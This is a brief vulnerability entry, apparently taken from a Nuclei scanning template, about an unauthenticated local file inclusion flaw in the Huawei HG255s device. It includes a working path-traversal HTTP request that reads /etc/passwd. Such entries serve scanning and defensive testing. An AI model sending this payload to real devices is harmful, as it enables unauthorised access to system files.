# Vulnerability: Huawei HG255s - Local File Inclusion
**Classification:** CWE-23
**Source:** Nuclei Template (`huawei-hg255s-lfi.yaml`)

## Description
Huawei HG255s is vulnerable to local file inclusion due to insufficient validation of the received HTTP requests. A remote attacker may access the local files on the device without authentication.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
```

